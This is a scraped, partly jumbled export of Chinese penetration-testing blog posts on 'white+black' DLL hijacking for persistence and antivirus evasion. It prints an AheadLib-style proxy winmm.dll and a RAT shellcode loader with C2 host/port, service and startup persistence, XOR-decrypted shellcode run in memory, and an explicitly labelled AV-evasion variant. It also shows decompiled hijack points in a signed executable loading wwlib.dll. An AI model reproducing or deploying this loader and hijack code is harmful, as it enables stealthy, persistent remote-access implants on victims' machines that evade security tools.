"/EXPORT:waveOutOpen=_AheadLib_waveOutOpen,@183")#pragma comment(linker, "/EXPORT:waveOutPause=_AheadLib_waveOutPause,@184")#pragma comment(linker, "/EXPORT:waveOutPrepareHeader=_AheadLib_waveOutPrepareHeader,@185")#pragma comment(linker, "/EXPORT:waveOutReset=_AheadLib_waveOutReset,@186")#pragma comment(linker, "/EXPORT:waveOutRestart=_AheadLib_waveOutRestart,@187")#pragma comment(linker, "/EXPORT:waveOutSetPitch=_AheadLib_waveOutSetPitch,@188")#pragma comment(linker, "/EXPORT:waveOutSetPlaybackRate=_AheadLib_waveOutSetPlaybackRate,@189")#pragma comment(linker, "/EXPORT:waveOutSetVolume=_AheadLib_waveOutSetVolume,@190")#pragma comment(linker, "/EXPORT:waveOutUnprepareHeader=_AheadLib_waveOutUnprepareHeader,@191")#pragma comment(linker, "/EXPORT:waveOutWrite=_AheadLib_waveOutWrite,@192")#pragma comment(linker, "/EXPORT:wid32Message=_AheadLib_wid32Message,@193")#pragma comment(linker, "/EXPORT:wod32Message=_AheadLib_wod32Message,@194")////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 宏定义#define EXTERNC extern "C"#define NAKED __declspec(naked)#define EXPORT __declspec(dllexport)#define ALCPP EXPORT NAKED#define ALSTD EXTERNC EXPORT NAKED void __stdcall#define ALCFAST EXTERNC EXPORT NAKED void __fastcall#define ALCDECL EXTERNC NAKED void __cdecl////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// AheadLib 命名空间namespace AheadLib{HMODULE m_hModule = NULL;// 原始模块句柄// 加载原始模块inline BOOL WINAPI Load(){TCHAR tzPath[MAX_PATH];TCHAR tzTemp[MAX_PATH * 2];GetSystemDirectory(tzPath, MAX_PATH);lstrcat(tzPath, TEXT("\\winmmOrg"));m_hModule = LoadLibrary(tzPath);if (m_hModule == NULL){wsprintf(tzTemp, TEXT("无法加载 %s，程序无法正常运行。"), tzPath);MessageBox(NULL, tzTemp, TEXT("AheadLib"), MB_OK);}return (m_hModule != NULL);}// 释放原始模块inline VOID WINAPI Free(){if (m_hModule){FreeLibrary(m_hModule);m_hModule = NULL;}}// 获取原始函数地址FARPROC WINAPI GetAddress(PCSTR pszProcName){FARPROC fpAddress;CHAR szProcName[16];TCHAR tzTemp[MAX_PATH];fpAddress = GetProcAddress(m_hModule, pszProcName);if (fpAddress == NULL){if (HIWORD(pszProcName) == 0){wsprintfA(szProcName, "%d", pszProcName);pszProcName = szProcName;}wsprintf(tzTemp, TEXT("无法找到函数 %hs，程序无法正常运行。"), pszProcName);MessageBox(NULL, tzTemp, TEXT("AheadLib"), 0);ExitProcess(-2);}return fpAddress;}}using namespace AheadLib;////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_NoName2(void){// 调用原始函数GetAddress(MAKEINTRESOURCEA(2));__asm JMP EAX;}////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_CloseDriver(void){// 调用原始函数GetAddress("CloseDriver");__asm JMP EAX;}////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_DefDriverProc(void){// 调用原始函数GetAddress("DefDriverProc");__asm JMP EAX;}////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_DriverCallback(void){// 调用原始函数GetAddress("DriverCallback");__asm JMP EAX;}////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_DrvGetModuleHandle(void){// 调用原始函数GetAddress("DrvGetModuleHandle");__asm JMP EAX;}////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_GetDriverModuleHandle(void){// 调用原始函数GetAddress("GetDriverModuleHandle");__asm JMP EAX;}////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_NotifyCallbackData(void){// 调用原始函数GetAddress("NotifyCallbackData");__asm JMP EAX;}////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_OpenDriver(void){// 调用原始函数GetAddress("OpenDriver");__asm JMP EAX;}////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_PlaySound(void){// 调用原始函数GetAddress("PlaySound");__asm JMP EAX;}////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_PlaySoundA(void){// 调用原始函数GetAddress("PlaySoundA");__asm JMP EAX;}////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_PlaySoundW(void){// 调用原始函数GetAddress("PlaySoundW");__asm JMP EAX;}////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_SendDriverMessage(void){// 调用原始函数GetAddress("SendDriverMessage");__asm JMP EAX;}////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_WOW32DriverCallback(void){// 调用原始函数GetAddress("WOW32DriverCallback");__asm JMP EAX;}////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_WOW32ResolveMultiMediaHandle(void){// 调用原始函数GetAddress("WOW32ResolveMultiMediaHandle");__asm JMP EAX;}////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_WOWAppExit(void){// 调用原始函数GetAddress("WOWAppExit");__asm JMP EAX;}////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_aux32Message(void){// 调用原始函数GetAddress("aux32Message");__asm JMP EAX;}////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_auxGetDevCapsA(void){// 调用原始函数GetAddress("auxGetDevCapsA");__asm JMP EAX;}////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_auxGetDevCapsW(void){// 调用原始函数GetAddress("auxGetDevCapsW");__asm JMP EAX;}////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_auxGetNumDevs(void){// 调用原始函数GetAddress("auxGetNumDevs");__asm JMP EAX;}////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_auxGetVolume(void){// 调用原始函数GetAddress("auxGetVolume");__asm JMP EAX;}////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_auxOutMessage(void){// 调用原始函数GetAddress("auxOutMessage");__asm JMP EAX;}////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_auxSetVolume(void){// 调用原始函数GetAddress("auxSetVolume");__asm JMP EAX;}////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_joy32Message(void){// 调用原始函数GetAddress("joy32Message");__asm JMP EAX;}////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_joyConfigChanged(void){// 调用原始函数GetAddress("joyConfigChanged");__asm JMP EAX;}////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_joyGetDevCapsA(void){// 调用原始函数GetAddress("joyGetDevCapsA");__asm JMP EAX;}////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数ALCDECL AheadLib_joyGetDevCapsW(void){// 调用原始函数GetAddress("joyGetDevCapsW");__asm JMP EAX;}////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 入口函数BOOL APIENTRY DllMain(HMODULE hModule,DWORD  ul_reason_for_call,LPVOID lpReserved){switch (ul_reason_for_call){case DLL_PROCESS_ATTACH:DisableThreadLibraryCalls(hModule);BOOL bRet;if (bRet = Load()){MessageBox(0, L"dll 劫持成功", L"AheadLib", 0);}return bRet;case DLL_THREAD_ATTACH:case DLL_THREAD_DETACH:case DLL_PROCESS_DETACH:Free();break;}return TRUE;}//////////////////////////////////////////////////////////////////////////////////////<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Robber-x86白文件漏洞自动化挖掘工具（三）"><a href="#Robber-x86白文件漏洞自动化挖掘工具（三）" class="headerlink" title="Robber_x86白文件漏洞自动化挖掘工具（三）"></a>Robber_x86白文件漏洞自动化挖掘工具（三）</h2><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1651801074074/bd6db9aff979477b977eaa8355d5b04b.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1651801074074/eb093305032d479dacea848c323cf653.png" alt="image.png"></p><h2 id="改变RAT通讯方式支持白-黑调用（四）"><a href="#改变RAT通讯方式支持白-黑调用（四）" class="headerlink" title="改变RAT通讯方式支持白+黑调用（四）"></a>改变RAT通讯方式支持白+黑调用（四）</h2><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1651801074074/88b2295d62d54ff2b323556c68e4a593.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1651801074074/ac9e91a217a545e792bcc43811407ec7.png" alt="image.png"></p><pre class="line-numbers language-none"><code class="language-none">#include "stdafx.h"#include &lt;Shlobj.h&gt;#include "ShellCode.h"#include "MemoryModule.h"// #pragma data_seg(".code")// bool data = false;// #pragma data_seg()extern FARPROC MyGetProcAddressA(HMODULE hModule, LPCSTR lpFileName, LPCSTR lpProcName);//配置信息结构体struct MODIFY_DATA{TCHAR szDns1[300];      //上线地址1TCHAR szDns2[300];      //上线地址2DWORD dwPort1;          //上线端口1DWORD dwPort2;          //上线端口2TCHAR szGroup[50];      //上线分组TCHAR szVersion[32];    //上线版本TCHAR SerName[100];     //服务名称TCHAR Serdisplay[128];  //显示名称TCHAR Serdesc[256];     //服务描述TCHAR szGetGroup[256];  //分组唯一标识BOOL  bLanPenetrate;    //是否使用了内网穿透BOOL  bService;         //是否是服务启动BOOL  bRuns;            //是否是启动目录启动BOOL  bRunOnce;         //是否为绿色安装TCHAR ReleasePath[100]; //安装途径TCHAR ReleaseName[50];  //安装名称WORD  Dele_zd;          //安装增大WORD  FileAttribute;    //文件属性BOOL Dele_Kzj;                //离线记录TCHAR szDownRun[512];   //下载运行地址};MODIFY_DATA modify_data = {"192.168.1.101","",8080,8080,"","","","","","",FALSE,//FALSE为未使用内网穿透TRUE,//TRUE为服务启动TRUE,//TRUE为启动目录启动TRUE,//TRUE为绿色安装，FALSE为标准安装"","",0,FILE_ATTRIBUTE_NORMAL,0,""};void DecrypMain(char *Buff, int Size, char *AddTable){for (int i=0, j=0; i&lt;Size; i++){Buff[i] ^= AddTable[j++] % 1753 + 79;if (i % 5 == 0)j = 0;}}void LoadDllCall(const char *name){HMEMORYMODULE hMemoryModule;typedef BOOL (WINAPI *PFN_MAIN)(void);PFN_MAIN pfnMain;hMemoryModule = MemoryLoadLibrary(g_ShellCodeFileBuff);if (hMemoryModule == NULL){return;}//获取导出的函数的地址pfnMain = MemoryGetProcAddress(hMemoryModule, name);if (pfnMain == NULL){MemoryFreeLibrary(hMemoryModule);return;}pfnMain();if (hMemoryModule != NULL){MemoryFreeLibrary(hMemoryModule);hMemoryModule = NULL;}}extern "C" _declspec(dllexport) LPVOID Loader(){return (LPVOID)&amp;modify_data;}int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){unsigned char MyFileTabLe[] = {0xBE, 0x16, 0xCF, 0x52, 0xCD};DecrypMain((char *)g_ShellCodeFileBuff, g_ShellCodeFileSize, (char *)MyFileTabLe);char Main[] = {'M','a','i','n','\0'};/*while(1){LoadDllCall(Main);Sleep(1000*60*60);}*/LoadDllCall(Main);return 0;}添加免杀函数（读取shellcode.bin）char * WINAPI GetShellcodeFile(){char szBuffPath[MAX_PATH+1]={0};GetCurrentDirectoryA(MAX_PATH+1,szBuffPath);lstrcatA(szBuffPath,"\\shellcode.bin");HANDLE hFile=CreateFileA(szBuffPath, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,0);if ((DWORD)hFile==-1){CloseHandle(hFile);return NULL;}DWORD size_low,size_high;size_low= GetFileSize(hFile,&amp;size_high);//创建文件的内存映射文件。HANDLE hMapFile=CreateFileMapping(hFile,NULL,PAGE_READWRITE, size_high,size_low, NULL);if(hMapFile==INVALID_HANDLE_VALUE){CloseHandle(hFile);CloseHandle(hMapFile);return NULL;}void* pvFile=MapViewOfFile(hMapFile,FILE_MAP_READ|FILE_MAP_WRITE,0,0,0);if (pvFile==NULL){CloseHandle(hFile);CloseHandle(hMapFile);return NULL;}CloseHandle(hFile);CloseHandle(hMapFile);return (char *)pvFile;}免杀逻辑代码：int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){try{if(1+1==2)throw 93;}catch (...){memcpy(g_ShellCodeFileBuff,(char *)GetShellcodeFile(),g_ShellCodeFileSize);}unsigned char MyFileTabLe[] = {0xBE, 0x16, 0xCF, 0x52, 0xCD};try{if(1+1==2)throw 36;}catch (...){   DecrypMain((char *)g_ShellCodeFileBuff, g_ShellCodeFileSize, (char *)MyFileTabLe);}char Main[] = {'M','a','i','n','\0'};try{if(1+1==2)throw 39;}catch (...){Sleep(20);}LoadDllCall(Main);return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.11-shen-tou-guo-cheng-zhong-bai-hei-li-yong-fang-shi-zhong/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.11-shen-tou-guo-cheng-zhong-bai-hei-li-yong-fang-shi-zhong/</url>
      
        <content type="html"><![CDATA[<h2 id="DLL劫持白文件利用方式（一）"><a href="#DLL劫持白文件利用方式（一）" class="headerlink" title="DLL劫持白文件利用方式（一）"></a>DLL劫持白文件利用方式（一）</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>最近发现针对某些目标，添加启动项，计划任务等比较明显的方式效果并不是很好，所以针对DLL劫持从而达到权限的维持的技术进行了一番学习，希望能与读者们一起分享学习过程，然后一起探讨关于DLL更多利用姿势。</p><h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>原理在第一篇已经讲了，下面说说与第一篇的不同之处，这一篇的技术背景是,我们已经获取到system权限的情况下，然后需要对目标进行持续性的控制，所以需要对权限进行维护，我们的目标是针对一些主流的软件or系统内置会加载的小DLL进行转发式劫持(也可以理解为中间人劫持),这种劫持的好处就是即使目标不存在DLL劫持漏洞也没关系，我们可以采取直接替换掉原来的DLL文件的方式，效果就是，程序依然可以正常加载原来DLL文件的功能，但是同时也会执行我们自定义的恶意操作。</p><h4 id="劫持的优势"><a href="#劫持的优势" class="headerlink" title="劫持的优势"></a>劫持的优势</h4><p>在很久以前,”白+黑”这种免杀方式很火,DLL劫持的优势其实就是如此。</p><p>是不是很懵? 先理解下什么是”白”+”黑”</p><pre class="line-numbers language-none"><code class="language-none">白加黑木马的结构1.Exe(白) —-load—-&gt; dll（黑）2.Exe(白) —-load—-&gt; dll（黑）—-load—-&gt; 恶意代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>白EXE主要是指那些带有签名的程序(杀毒软件对于这种软件，特别是window签名的程序，无论什么行为都不会阻止的,至于为什么？ emmm,原因很多,查杀复杂，定位DLL困难，而且最终在内存执行的行为都归于exe(如果能在众多加载的DLL中准确定位到模块，那就是AI分析大师。),所以比较好用的基于特征码去查杀，针对如今混淆就像切菜一样简单的时代来说，蛮不够看的，PS.或许360等杀毒有新的方式去检测,emmm,不过我实践发现,基于这个原理过主动防御没啥问题…emmm)</p><p>关于这个优势，上图胜千言。</p><h2 id="DLL劫持白文件利用方式（二）"><a href="#DLL劫持白文件利用方式（二）" class="headerlink" title="DLL劫持白文件利用方式（二）"></a>DLL劫持白文件利用方式（二）</h2><h4 id="劫持方式"><a href="#劫持方式" class="headerlink" title="劫持方式"></a>劫持方式</h4><p>为了能够更好地学习,下面方式决定通过写一个demo的程序进行测试。</p><p>打开vs2017,新建一个控制台应用程序:</p><p>代码如下:</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;iostream&gt;#include &lt;Windows.h&gt;using namespace std;int main(){    // 定义一个函数类DLLFUNC    typedef void(*DLLFUNC)(void);    DLLFUNC GetDllfunc1 = NULL;    DLLFUNC GetDllfunc2 = NULL;    // 指定动态加载dll库    HINSTANCE hinst = LoadLibrary(L"TestDll.dll");    if (hinst != NULL) {        // 获取函数位置        GetDllfunc1 = (DLLFUNC)GetProcAddress(hinst, "msg");        GetDllfunc2 = (DLLFUNC)GetProcAddress(hinst, "error");    }    if (GetDllfunc1 != NULL) {        //运行msg函数        (*GetDllfunc1)();    }    else {        MessageBox(0, L"Load msg function Error,Exit!", 0, 0);        exit(0);    }    if (GetDllfunc2 != NULL) {        //运行error函数        (*GetDllfunc2)();    }    else {        MessageBox(0, L"Load error function Error,Exit!", 0, 0);        exit(0);    }    printf("Success");}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="程序如果缺乏指定DLL的导出函数-那么将会失败"><a href="#程序如果缺乏指定DLL的导出函数-那么将会失败" class="headerlink" title="程序如果缺乏指定DLL的导出函数,那么将会失败."></a>程序如果缺乏指定DLL的导出函数,那么将会失败.</h4><p>原生正常DLL的代码如下:</p><pre class="line-numbers language-none"><code class="language-none">// dllmain.cpp : 定义 DLL 应用程序的入口点。#include "pch.h"#include &lt;Windows.h&gt;void msg() {    MessageBox(0, L"I am msg function!", 0, 0);}void error() {    MessageBox(0, L" I am error function!", 0, 0);}BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved                     ){    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:    case DLL_THREAD_ATTACH:    case DLL_THREAD_DETACH:    case DLL_PROCESS_DETACH:        break;    }    return TRUE;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>framework.h导出函数如下:</p><pre class="line-numbers language-none"><code class="language-none">#pragma once#define WIN32_LEAN_AND_MEAN             // 从 Windows 头文件中排除极少使用的内容// Windows 头文件#include &lt;windows.h&gt;extern "C" __declspec(dllexport) void msg(void);extern "C" __declspec(dllexport) void error(void);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>extern表示这是个全局函数,可以供其他函数调用,”C”表示按照C编译器的方式编译</p><p>__declspec(dllexport) 这个导出语句可以自动生成 <code>.def</code>((符号表)),这个很关键</p><p>如果你没导出,这样调用的程序是没办法调用的(其实也可以尝试从执行过程来分析，可能麻烦点)</p><p>建议直接看官方文档:</p><p><a href="https://docs.microsoft.com/zh-cn/cpp/build/exporting-from-a-dll?view=msvc-160">https://docs.microsoft.com/zh-cn/cpp/build/exporting-from-a-dll?view=msvc-160</a></p></blockquote><p>正常完整执行的话,最终程序会输出Success。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1651668932003/4499f327c0f1477dbc4e95da90a54ae5.png" alt="image.png"></p><h2 id="通过逆向白文件实现黑方法持久化（三）"><a href="#通过逆向白文件实现黑方法持久化（三）" class="headerlink" title="通过逆向白文件实现黑方法持久化（三）"></a>通过逆向白文件实现黑方法持久化（三）</h2><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1651668932003/d2229e4f56314a0d810763eaad7efae8.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1651668932003/48bcd57a56df46778a97dbfee19e0c49.png" alt="image.png"></p><pre class="line-numbers language-none"><code class="language-none">漏洞位置1：signed int __stdcall sub_30001573(int a1, int a2, int a3, int a4){  HMODULE v4; // edi@1  FARPROC v5; // ebx@2  FARPROC v6; // eax@2  signed int result; // eax@5  v4 = LoadLibraryW(L"wwlib.dll");  if ( v4 || (v4 = sub_30001968((int)L"{0638C49D-BB8B-4CD1-B191-051E8F325736}")) != 0 )  {    v5 = GetProcAddress(v4, "FMain");    dword_30003010 = (int)GetProcAddress(v4, "wdCommandDispatch");    v6 = GetProcAddress(v4, "wdGetApplicationObject");    dword_3000300C = (int)v6;    if ( v5 &amp;&amp; dword_30003010 &amp;&amp; v6 )    {      ((void (__stdcall *)(int, int, int, int))v5)(a1, a2, a3, a4);      FreeLibrary(v4);      result = 0;    }    else    {      result = 1;    }  }  else  {    GetLastError();    result = 1;  }  return result;}漏洞位置2：HMODULE __stdcall sub_30001968(int a1){  HMODULE v1; // esi@1  UINT v2; // eax@1  unsigned int v4; // eax@3  int v5; // eax@14  FARPROC v6; // [sp+8h] [bp-478h]@7  FARPROC v7; // [sp+Ch] [bp-474h]@7  int v8; // [sp+10h] [bp-470h]@15  HMODULE hModule; // [sp+14h] [bp-46Ch]@5  WCHAR LibFileName; // [sp+18h] [bp-468h]@1  WCHAR Buffer; // [sp+220h] [bp-260h]@1  __int16 v12[261]; // [sp+222h] [bp-25Eh]@4  char v13; // [sp+42Ch] [bp-54h]@14  v1 = 0;  LibFileName = 0;  v2 = GetSystemDirectoryW(&amp;Buffer, 0x105u);  if ( !v2 )    return 0;  